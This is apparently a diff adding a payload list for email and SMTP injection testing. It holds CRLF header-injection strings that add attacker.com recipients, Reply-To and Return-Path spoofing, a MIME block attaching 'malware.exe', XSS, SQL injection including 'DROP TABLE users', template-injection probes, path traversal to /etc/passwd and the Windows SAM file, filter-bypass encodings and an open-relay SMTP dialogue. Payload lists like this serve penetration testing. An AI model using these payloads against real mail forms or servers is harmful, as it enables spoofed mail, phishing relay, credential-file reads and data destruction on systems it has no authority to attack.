@@ -1,0 +1,163 @@
+# SMTP Injection Payloads - Comprehensive Collection
+# Version: 1.0.18-20260301-Senin-1812-WIB
+# Category: SMTP Injection / Email Injection
+
+# ============================================
+# BASIC SMTP INJECTION
+# ============================================
+
+# Newline injection
+test%0A%0DCC:admin@attacker.com
+test%0ACC:admin@attacker.com
+test%0ABCC:admin@attacker.com
+
+# Additional headers
+test%0ASubject: Hacked
+test%0AFrom: attacker@attacker.com
+test%0ATo: victim@target.com
+
+# ============================================
+# SMTP COMMAND INJECTION
+# ============================================
+
+# Add additional recipients
+recipient@attacker.com
+,admin@attacker.com
+;admin@attacker.com
+|admin@attacker.com
+
+# Modify subject
+Subject: Hacked
+Subject: =?utf-8?B?SGFja2Vk?=
+
+# Add attachments via MIME
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary=boundary
+--boundary
+Content-Type: text/plain
+Malicious content
+--boundary
+Content-Type: application/octet-stream; name="malware.exe"
+Content-Transfer-Encoding: base64
+[BASE64_PAYLOAD]
+--boundary--
+
+# ============================================
+# EMAIL HEADER INJECTION
+# ============================================
+
+# X-Mailer injection
+X-Mailer: <script>alert(1)</script>
+X-Mailer: Malicious Software
+
+# Reply-To manipulation
+Reply-To: attacker@attacker.com
+Reply-To: <attacker@attacker.com>
+
+# Return-Path
+Return-Path: <attacker@attacker.com>
+
+# ============================================
+# BYPASS FILTER
+# ============================================
+
+# Case variation
+TEST@ATTACKER.COM
+Test@Attacker.Com
+TeSt@AtTaCkEr.cOm
+
+# URL encoding
+test%40attacker.com
+test%40attacker%2Ecom
+
+# Double encoding
+test%2540attacker.com
+
+# Null byte
+test@attacker.com%00@target.com
+
+# Comments
+test(comment)@attacker.com
+
+# ============================================
+# MIME TYPE MANIPULATION
+# ============================================
+
+Content-Type: text/html; charset=utf-8
+Content-Type: multipart/related
+
+# ============================================
+# XSS VIA EMAIL
+# ============================================
+
+# Subject XSS
+Subject: <script>alert(1)</script>
+Subject: <img src=x onerror=alert(1)>
+
+# Body XSS
+<body onload=alert(1)>
+<img src=x onerror=alert(1)>
+<script>alert(1)</script>
+
+# ============================================
+# SQL INJECTION VIA EMAIL
+# ============================================
+
+email@attacker.com' OR '1'='1
+email@attacker.com' OR 1=1--
+email@attacker.com"; DROP TABLE users;--
+
+# ============================================
+# CRLF INJECTION
+# ============================================
+
+test%0D%0A%0D%0AHacked
+test%0ASubject: Hacked%0AFrom: attacker@attacker.com
+
+# ============================================
+# TEMPLATE INJECTION
+# ============================================
+
+# Server-Side Template Injection in email
+{{7*7}}
+{{config}}
+{% if 1==1 %}Hacked{% endif %}
+
+# ============================================
+# PATH TRAVERSAL IN ATTACHMENT
+# ============================================
+
+filename=../../../../etc/passwd
+filename=..\\..\\..\\windows\\system32\\config\\sam
+
+# ============================================
+# BOM BYPASS
+# ============================================
+
+\xEF\xBB\xBF<script>alert(1)</script>
+
+# ============================================
+# UTF-7 XSS
+# ============================================
+
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+
+# ============================================
+# DATA URI
+# ============================================
+
+data:text/html,<script>alert(1)</script>
+
+# ============================================
+# SMTP OPEN RELAY TEST
+# ============================================
+
+MAIL FROM: <attacker@attacker.com>
+RCPT TO: <victim@target.com>
+RCPT TO: <relay@openmailserver.com>
+DATA
+Subject: Test
+Body
+
+.
+
